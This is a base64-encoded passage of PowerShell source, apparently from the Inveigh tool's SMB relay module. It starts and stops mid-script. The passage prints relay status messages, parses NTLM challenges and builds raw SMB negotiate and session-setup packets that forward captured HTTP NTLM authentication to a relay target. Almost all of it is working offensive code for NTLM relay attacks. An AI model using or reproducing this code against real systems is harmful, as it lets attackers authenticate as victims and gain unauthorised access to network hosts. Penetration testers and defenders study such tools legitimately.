ICBlbHNlCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiUmVhbCBUaW1lIEZpbGUgT3V0cHV0IERpc2FibGVkIil8T3V0LU51bGwKICAgIH0KCiAgICBpZigkUnVuVGltZSAtZXEgMSkKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuYWRkKCJSdW4gVGltZSA9ICRSdW5UaW1lIE1pbnV0ZSIpfE91dC1OdWxsCiAgICB9CiAgICBlbHNlaWYoJFJ1blRpbWUgLWd0IDEpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiUnVuIFRpbWUgPSAkUnVuVGltZSBNaW51dGVzIil8T3V0LU51bGwKICAgIH0KfQoKJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiU01CIFJlbGF5IEVuYWJsZWQiKSB8T3V0LU51bGwKJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiU01CIFJlbGF5IFRhcmdldCA9ICRTTUJSZWxheVRhcmdldCIpfE91dC1OdWxsCgppZigkU01CUmVsYXlVc2VybmFtZXMpCnsKICAgIGlmKCRTTUJSZWxheVVzZXJuYW1lcy5Db3VudCAtZXEgMSkKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuYWRkKCJTTUIgUmVsYXkgVXNlcm5hbWUgPSAiICsgJFNNQlJlbGF5VXNlcm5hbWVzIC1qb2luICIsIil8T3V0LU51bGwKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuYWRkKCJTTUIgUmVsYXkgVXNlcm5hbWVzID0gIiArICRTTUJSZWxheVVzZXJuYW1lcyAtam9pbiAiLCIpfE91dC1OdWxsCiAgICB9Cn0KCmlmKCRTTUJSZWxheUF1dG9EaXNhYmxlIC1lcSAneScpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIlNNQiBSZWxheSBBdXRvIERpc2FibGUgRW5hYmxlZCIpfE91dC1OdWxsCn0KZWxzZQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuYWRkKCJTTUIgUmVsYXkgQXV0byBEaXNhYmxlIERpc2FibGVkIil8T3V0LU51bGwKfQoKaWYoJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIlNNQiBSZWxheSBOZXR3b3JrIFRpbWVvdXQgPSAkU01CUmVsYXlOZXR3b3JrVGltZW91dCBTZWNvbmRzIil8T3V0LU51bGwKfQoKaWYoJFNob3dIZWxwIC1lcSAneScpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIlVzZSBHZXQtQ29tbWFuZCAtTm91biBJbnZlaWdoKiB0byBzaG93IGF2YWlsYWJsZSBmdW5jdGlvbnMiKXxPdXQtTnVsbAogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiUnVuIFN0b3AtSW52ZWlnaCB0byBzdG9wIEludmVpZ2giKXxPdXQtTnVsbAogICAgICAgIAogICAgaWYoJGludmVpZ2guY29uc29sZV9vdXRwdXQpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiUHJlc3MgYW55IGtleSB0byBzdG9wIHJlYWwgdGltZSBjb25zb2xlIG91dHB1dCIpfE91dC1OdWxsCiAgICB9Cn0KCmlmKCRpbnZlaWdoLnN0YXR1c19vdXRwdXQpCnsKICAgIHdoaWxlKCRpbnZlaWdoLnN0YXR1c19xdWV1ZS5Db3VudCAtZ3QgMCkKICAgIHsKICAgICAgICBpZigkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkpCiAgICAgICAgewogICAgICAgICAgICB3cml0ZS1vdXRwdXQoJGludmVpZ2guc3RhdHVzX3F1ZXVlWzBdICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgc3dpdGNoICgkaW52ZWlnaC5zdGF0dXNfcXVldWVbMF0pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJSdW4gU3RvcC1JbnZlaWdoIHRvIHN0b3AgSW52ZWlnaCIKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICB3cml0ZS13YXJuaW5nKCRpbnZlaWdoLnN0YXR1c19xdWV1ZVswXSkKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZGVmYXVsdAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHdyaXRlLW91dHB1dCgkaW52ZWlnaC5zdGF0dXNfcXVldWVbMF0pCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKJHByb2Nlc3NfSUQgPSBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpHZXRDdXJyZW50UHJvY2VzcygpIHxTZWxlY3QtT2JqZWN0IC1leHBhbmQgaWQKJHByb2Nlc3NfSUQgPSBbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwcm9jZXNzX0lEKSkKJHByb2Nlc3NfSUQgPSAkcHJvY2Vzc19JRCAtcmVwbGFjZSAiLTAwLTAwIiwiIgpbQnl0ZVtdXSRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXMgPSAkcHJvY2Vzc19JRC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NIQVJdW0NPTlZFUlRdOjp0b2ludDE2KCRfLDE2KX0KCiMgQmVnaW4gU2NyaXB0QmxvY2tzCgojIFNoYXJlZCBCYXNpYyBGdW5jdGlvbnMgU2NyaXB0QmxvY2sKJHNoYXJlZF9iYXNpY19mdW5jdGlvbnNfc2NyaXB0YmxvY2sgPQp7CiAgICBGdW5jdGlvbiBEYXRhVG9VSW50MTYoJGZpZWxkKQogICAgewoJICAgW0FycmF5XTo6UmV2ZXJzZSgkZmllbGQpCgkgICByZXR1cm4gW0JpdENvbnZlcnRlcl06OlRvVUludDE2KCRmaWVsZCwwKQogICAgfQoKICAgIEZ1bmN0aW9uIERhdGFUb1VJbnQzMigkZmllbGQpCiAgICB7CgkgICBbQXJyYXldOjpSZXZlcnNlKCRmaWVsZCkKCSAgIHJldHVybiBbQml0Q29udmVydGVyXTo6VG9VSW50MzIoJGZpZWxkLDApCiAgICB9CgogICAgRnVuY3Rpb24gRGF0YUxlbmd0aAogICAgewogICAgICAgIHBhcmFtIChbaW50XSRsZW5ndGhfc3RhcnQsW2J5dGVbXV0kc3RyaW5nX2V4dHJhY3RfZGF0YSkKCiAgICAgICAgJHN0cmluZ19sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvSW50MTYoJHN0cmluZ19leHRyYWN0X2RhdGFbJGxlbmd0aF9zdGFydC4uKCRsZW5ndGhfc3RhcnQgKyAxKV0sMCkKICAgICAgICByZXR1cm4gJHN0cmluZ19sZW5ndGgKICAgIH0KCiAgICBGdW5jdGlvbiBEYXRhVG9TdHJpbmcKICAgIHsKICAgICAgICBwYXJhbSAoW2ludF0kc3RyaW5nX2xlbmd0aCxbaW50XSRzdHJpbmcyX2xlbmd0aCxbaW50XSRzdHJpbmczX2xlbmd0aCxbaW50XSRzdHJpbmdfc3RhcnQsW2J5dGVbXV0kc3RyaW5nX2V4dHJhY3RfZGF0YSkKCiAgICAgICAgJHN0cmluZ19kYXRhID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkc3RyaW5nX2V4dHJhY3RfZGF0YVsoJHN0cmluZ19zdGFydCskc3RyaW5nMl9sZW5ndGgrJHN0cmluZzNfbGVuZ3RoKS4uKCRzdHJpbmdfc3RhcnQrJHN0cmluZ19sZW5ndGgrJHN0cmluZzJfbGVuZ3RoKyRzdHJpbmczX2xlbmd0aC0xKV0pCiAgICAgICAgJHN0cmluZ19kYXRhID0gJHN0cmluZ19kYXRhIC1yZXBsYWNlICItMDAiLCIiCiAgICAgICAgJHN0cmluZ19kYXRhID0gJHN0cmluZ19kYXRhLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHsgW0NIQVJdW0NPTlZFUlRdOjp0b2ludDE2KCRfLDE2KX0KICAgICAgICAkc3RyaW5nX2V4dHJhY3QgPSBOZXctT2JqZWN0IFN5c3RlbS5TdHJpbmcgKCRzdHJpbmdfZGF0YSwwLCRzdHJpbmdfZGF0YS5MZW5ndGgpCiAgICAgICAgcmV0dXJuICRzdHJpbmdfZXh0cmFjdAogICAgfQp9CgojIFNNQiBOVExNIEZ1bmN0aW9ucyBTY3JpcHRCbG9jayAtIGZ1bmN0aW9uIGZvciBwYXJzaW5nIE5UTE0gY2hhbGxlbmdlL3Jlc3BvbnNlCiRTTUJfTlRMTV9mdW5jdGlvbnNfc2NyaXB0YmxvY2sgPQp7CiAgICBGdW5jdGlvbiBTTUJOVExNQ2hhbGxlbmdlCiAgICB7CiAgICAgICAgcGFyYW0gKFtieXRlW11dJHBheWxvYWRfYnl0ZXMpCgogICAgICAgICRwYXlsb2FkID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkcGF5bG9hZF9ieXRlcykKICAgICAgICAkcGF5bG9hZCA9ICRwYXlsb2FkIC1yZXBsYWNlICItIiwiIgogICAgICAgICROVExNX2luZGV4ID0gJHBheWxvYWQuSW5kZXhPZigiNEU1NDRDNEQ1MzUzNTAwMCIpCgogICAgICAgIGlmKCRwYXlsb2FkLlN1YlN0cmluZygoJE5UTE1faW5kZXggKyAxNiksOCkgLWVxICIwMjAwMDAwMCIpCiAgICAgICAgewogICAgICAgICAgICAkTlRMTV9jaGFsbGVuZ2UgPSAkcGF5bG9hZC5TdWJTdHJpbmcoKCROVExNX2luZGV4ICsgNDgpLDE2KQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICROVExNX2NoYWxsZW5nZQogICAgfQp9CgojIFNNQiBSZWxheSBDaGFsbGVuZ2UgU2NyaXB0QmxvY2sgLSBnYXRoZXJzIE5UTE0gc2VydmVyIGNoYWxsZW5nZSBmcm9tIHJlbGF5IHRhcmdldAokU01CX3JlbGF5X2NoYWxsZW5nZV9zY3JpcHRibG9jayA9CnsKICAgIEZ1bmN0aW9uIFNNQlJlbGF5Q2hhbGxlbmdlCiAgICB7CiAgICAgICAgcGFyYW0gKCRTTUJfcmVsYXlfc29ja2V0LCRIVFRQX3JlcXVlc3RfYnl0ZXMpCgogICAgICAgIGlmICgkU01CX3JlbGF5X3NvY2tldCkKICAgICAgICB7CiAgICAgICAgICAgICRTTUJfcmVsYXlfY2hhbGxlbmdlX3N0cmVhbSA9ICRTTUJfcmVsYXlfc29ja2V0LkdldFN0cmVhbSgpCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRTTUJfcmVsYXlfY2hhbGxlbmdlX2J5dGVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQKCiAgICAgICAgJGkgPSAwCiAgICAgICAgCiAgICAgICAgOlNNQl9yZWxheV9jaGFsbGVuZ2VfbG9vcCB3aGlsZSAoJGkgLWx0IDIpCiAgICAgICAgewogICAgICAgICAgICBzd2l0Y2ggKCRpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAwIHsKICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSAkU01CX3JlbGF5X2NoYWxsZW5nZV9zZW5kID0gKDB4MDAsMHgwMCwweDAwLDB4MmYsMHhmZiwweDUzLDB4NGQsMHg0MiwweDcyLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxOCwweDAxLDB4NDgpYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweGZmLDB4ZmYpYAogICAgICAgICAgICAgICAgICAgICAgICArICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDBjLDB4MDAsMHgwMiwweDRlLDB4NTQsMHgyMCwweDRjLDB4NGQsMHgyMCwweDMwLDB4MmUsMHgzMSwweDMyLDB4MDApCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIDEgeyAKICAgICAgICAgICAgICAgICAgICAkU01CX2xlbmd0aF8xID0gJzB4ezA6WDJ9JyAtZiAoJEhUVFBfcmVxdWVzdF9ieXRlcy5sZW5ndGggKyAzMikKICAgICAgICAgICAgICAgICAgICAkU01CX2xlbmd0aF8yID0gJzB4ezA6WDJ9JyAtZiAoJEhUVFBfcmVxdWVzdF9ieXRlcy5sZW5ndGggKyAyMikKICAgICAgICAgICAgICAgICAgICAkU01CX2xlbmd0aF8zID0gJzB4ezA6WDJ9JyAtZiAoJEhUVFBfcmVxdWVzdF9ieXRlcy5sZW5ndGggKyAyKQogICAgICAgICAgICAgICAgICAgICRTTUJfTlRMTVNTUF9sZW5ndGggPSAnMHh7MDpYMn0nIC1mICgkSFRUUF9yZXF1ZXN0X2J5dGVzLmxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAkU01CX2Jsb2JfbGVuZ3RoID0gW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF9yZXF1ZXN0X2J5dGVzLmxlbmd0aCArIDM0KSkKICAgICAgICAgICAgICAgICAgICAkU01CX2Jsb2JfbGVuZ3RoID0gJFNNQl9ibG9iX2xlbmd0aCAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICAgICAgICAgICAgICRTTUJfYmxvYl9sZW5ndGggPSAkU01CX2Jsb2JfbGVuZ3RoLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHsgW0NIQVJdW0NPTlZFUlRdOjp0b2ludDE2KCRfLDE2KX0KICAgICAgICAgICAgICAgICAgICAkU01CX2J5dGVfY291bnQgPSBbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3JlcXVlc3RfYnl0ZXMubGVuZ3RoICsgNDUpKQogICAgICAgICAgICAgICAgICAgICRTTUJfYnl0ZV9jb3VudCA9ICRTTUJfYnl0ZV9jb3VudCAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICAgICAgICAgICAgICRTTUJfYnl0ZV9jb3VudCA9ICRTTUJfYnl0ZV9jb3VudC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7IFtDSEFSXVtDT05WRVJUXTo6dG9pbnQxNigkXywxNil9CiAgICAgICAgICAgICAgICAgICAgJFNNQl9uZXRiaW9zX2xlbmd0aCA9IFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJEhUVFBfcmVxdWVzdF9ieXRlcy5sZW5ndGggKyAxMDQpKQogICAgICAgICAgICAgICAgICAgICRTTUJfbmV0Ymlvc19sZW5ndGggPSAkU01CX25ldGJpb3NfbGVuZ3RoIC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgICAgICAgICAgICAgJFNNQl9uZXRiaW9zX2xlbmd0aCA9ICRTTUJfbmV0Ymlvc19sZW5ndGguU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0eyBbQ0hBUl1bQ09OVkVSVF06OnRvaW50MTYoJF8sMTYpfQogICAgICAgICAgICAgICAgICAgIFthcnJheV06OlJldmVyc2UoJFNNQl9uZXRiaW9zX2xlbmd0aCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSAkU01CX3JlbGF5X2NoYWxsZW5nZV9zZW5kID0gKDB4MDAsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9uZXRiaW9zX2xlbmd0aGAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHhmZiwweDUzLDB4NGQsMHg0MiwweDczLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxOCwweDAxLDB4NDgsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHhmZiwweGZmKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MGMsMHhmZiwweDAwLDB4MDAsMHgwMCwweGZmLDB4ZmYsMHgwMiwweDAwLDB4MDEsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX2Jsb2JfbGVuZ3RoYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4NDQsMHgwMCwweDAwLDB4ODApYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfYnl0ZV9jb3VudGAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHg2MClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9sZW5ndGhfMWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwNiwweDA2LDB4MmIsMHgwNiwweDAxLDB4MDUsMHgwNSwweDAyLDB4YTApYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfbGVuZ3RoXzJgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MzAsMHgzYywweGEwLDB4MGUsMHgzMCwweDBjLDB4MDYsMHgwYSwweDJiLDB4MDYsMHgwMSwweDA0LDB4MDEsMHg4MiwweDM3LDB4MDIsMHgwMiwweDBhLDB4YTIpYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfbGVuZ3RoXzNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDQpYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfTlRMTVNTUF9sZW5ndGhgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJEhUVFBfcmVxdWVzdF9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHg1NSwweDZlLDB4NjksMHg3OCwweDAwLDB4NTMsMHg2MSwweDZkLDB4NjIsMHg2MSwweDAwKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAkU01CX3JlbGF5X2NoYWxsZW5nZV9zdHJlYW0uV3JpdGUoJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc2VuZCwgMCwgJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc2VuZC5sZW5ndGgpCiAgICAgICAgICAgICRTTUJfcmVsYXlfY2hhbGxlbmdlX3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZigkU01CUmVsYXlOZXR3b3JrVGltZW91dCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNNQl9yZWxheV9jaGFsbGVuZ2VfdGltZW91dCA9IG5ldy10aW1lc3BhbiAtU2Vjb25kcyAkU01CUmVsYXlOZXR3b3JrVGltZW91dAogICAgICAgICAgICAgICAgJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc3RvcHdhdGNoID0gW2RpYWdub3N0aWNzLnN0b3B3YXRjaF06OlN0YXJ0TmV3KCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgd2hpbGUoISRTTUJfcmVsYXlfY2hhbGxlbmdlX3N0cmVhbS5EYXRhQXZhaWxhYmxlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfcmVsYXlfY2hhbGxlbmdlX3N0b3B3YXRjaC5lbGFwc2VkIC1nZSAkU01CX3JlbGF5X2NoYWxsZW5nZV90aW1lb3V0KQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIlNNQiByZWxheSB0YXJnZXQgZGlkbid0IHJlc3BvbmQgd2l0aGluICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0IHNlY29uZHMiKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuYWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgdGFyZ2V0IGRpZG4ndCByZXNwb25kIHdpdGhpbiAkU01CUmVsYXlOZXR3b3JrVGltZW91dCBzZWNvbmRzIildKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsgU01CX3JlbGF5X2NoYWxsZW5nZV9sb29wCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAKICAgICAgICAgICAgJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc3RyZWFtLlJlYWQoJFNNQl9yZWxheV9jaGFsbGVuZ2VfYnl0ZXMsIDAsICRTTUJfcmVsYXlfY2hhbGxlbmdlX2J5dGVzLmxlbmd0aCkKCiAgICAgICAgICAgICRpKysKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgcmV0dXJuICRTTUJfcmVsYXlfY2hhbGxlbmdlX2J5dGVzCiAgICB9Cn0KCiMgU01CIFJlbGF5IFJlc3BvbnNlIFNjcmlwdEJsb2NrIC0gc2VuZHMgTlRMTSByZXBvbnNlIHRvIHJlbGF5IHRhcmdldAokU01CX3JlbGF5X3Jlc3BvbnNlX3NjcmlwdGJsb2NrID0KewogICAgRnVuY3Rpb24gU01CUmVsYXlSZXNwb25zZQogICAgewogICAgICAgIHBhcmFtICgkU01CX3JlbGF5X3NvY2tldCwkSFRUUF9yZXF1ZXN0X2J5dGVzLCRTTUJfdXNlcl9JRCkKICAgIAogICAgICAgICRTTUJfcmVsYXlfcmVzcG9uc2VfYnl0ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNAoKICAgICAgICBpZiAoJFNNQl9yZWxheV9zb2NrZXQpCiAgICAgICAgewogICAgICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX3N0cmVhbSA9ICRTTUJfcmVsYXlfc29ja2V0LkdldFN0cmVhbSgpCiAgICAgICAgfQoKICAgICAgICAkU01CX2xlbmd0aF8xID0gW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF9yZXF1ZXN0X2J5dGVzLmxlbmd0aCArIDEyKSkKICAgICAgICAkU01CX2xlbmd0aF8xID0gJFNNQl9sZW5ndGhfMSAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICRTTUJfbGVuZ3RoXzEgPSAkU01CX2xlbmd0aF8xLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHsgW0NIQVJdW0NPTlZFUlRdOjp0b2ludDE2KCRfLDE2KX0KICAgICAgICAkU01CX2xlbmd0aF8yID0gW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF9yZXF1ZXN0X2J5dGVzLmxlbmd0aCArIDgpKQogICAgICAgICRTTUJfbGVuZ3RoXzIgPSAkU01CX2xlbmd0aF8yIC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgJFNNQl9sZW5ndGhfMiA9ICRTTUJfbGVuZ3RoXzIuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0eyBbQ0hBUl1bQ09OVkVSVF06OnRvaW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfbGVuZ3RoXzMgPSBbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3JlcXVlc3RfYnl0ZXMubGVuZ3RoICsgNCkpCiAgICAgICAgJFNNQl9sZW5ndGhfMyA9ICRTTUJfbGVuZ3RoXzMgLXJlcGxhY2UgIi0wMC0wMCIsIiIKICAgICAgICAkU01CX2xlbmd0aF8zID0gJFNNQl9sZW5ndGhfMy5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7IFtDSEFSXVtDT05WRVJUXTo6dG9pbnQxNigkXywxNil9CiAgICAgICAgJFNNQl9OVExNU1NQX2xlbmd0aCA9IFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJEhUVFBfcmVxdWVzdF9ieXRlcy5sZW5ndGgpKQogICAgICAgICRTTUJfTlRMTVNTUF9sZW5ndGggPSAkU01CX05UTE1TU1BfbGVuZ3RoIC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgJFNNQl9OVExNU1NQX2xlbmd0aCA9ICRTTUJfTlRMTVNTUF9sZW5ndGguU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0eyBbQ0hBUl1bQ09OVkVSVF06OnRvaW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfYmxvYl9sZW5ndGggPSBbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3JlcXVlc3RfYnl0ZXMubGVuZ3RoICsgMTYpKQogICAgICAgICRTTUJfYmxvYl9sZW5ndGggPSAkU01CX2Jsb2JfbGVuZ3RoIC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgJFNNQl9ibG9iX2xlbmd0aCA9ICRTTUJfYmxvYl9sZW5ndGguU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0eyBbQ0hBUl1bQ09OVkVSVF06OnRvaW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfYnl0ZV9jb3VudCA9IFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJEhUVFBfcmVxdWVzdF9ieXRlcy5sZW5ndGggKyAyNykpCiAgICAgICAgJFNNQl9ieXRlX2NvdW50ID0gJFNNQl9ieXRlX2NvdW50IC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgJFNNQl9ieXRlX2NvdW50ID0gJFNNQl9ieXRlX2NvdW50LlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHsgW0NIQVJdW0NPTlZFUlRdOjp0b2ludDE2KCRfLDE2KX0KICAgICAgICAkU01CX25ldGJpb3NfbGVuZ3RoID0gW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF9yZXF1ZXN0X2J5dGVzLmxlbmd0aCArIDg2KSkKICAgICAgICAkU01CX25ldGJpb3NfbGVuZ3RoID0gJFNNQl9uZXRiaW9zX2xlbmd0aCAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICRTTUJfbmV0Ymlvc19sZW5ndGggPSAkU01CX25ldGJpb3NfbGVuZ3RoLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHsgW0NIQVJdW0NPTlZFUlRdOjp0b2ludDE2KCRfLDE2KX0KICAgICAgICBbYXJyYXldOjpSZXZlcnNlKCRTTUJfbGVuZ3RoXzEpCiAgICAgICAgW2FycmF5XTo6UmV2ZXJzZSgkU01CX2xlbmd0aF8yKQogICAgICAgIFthcnJheV06OlJldmVyc2UoJFNNQl9sZW5ndGhfMykKICAgICAgICBbYXJyYXldOjpSZXZlcnNlKCRTTUJfTlRMTVNTUF9sZW5ndGgpCiAgICAgICAgW2FycmF5XTo6UmV2ZXJzZSgkU01CX25ldGJpb3NfbGVuZ3RoKQogICAgICAgIAogICAgICAgICRqID0gMAogICAgICAgIAogICAgICAgIDpTTUJfcmVsYXlfcmVzcG9uc2VfbG9vcCB3aGlsZSAoJGogLWx0IDEpCiAgICAgICAgewogICAgICAgICAgICBbQnl0ZVtdXSAkU01CX3JlbGF5X3Jlc3BvbnNlX3NlbmQgPSAoMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICsgJFNNQl9uZXRiaW9zX2xlbmd0aGAKICAgICAgICAgICAgICAgICsgKDB4ZmYsMHg1MywweDRkLDB4NDIsMHg3MywweDAwLDB4MDAsMHgwMCwweDAwLDB4MTgsMHgwMSwweDQ4LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4ZmYsMHhmZilgCiAgICAgICAgICAgICAgICArICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXNgCiAgICAgICA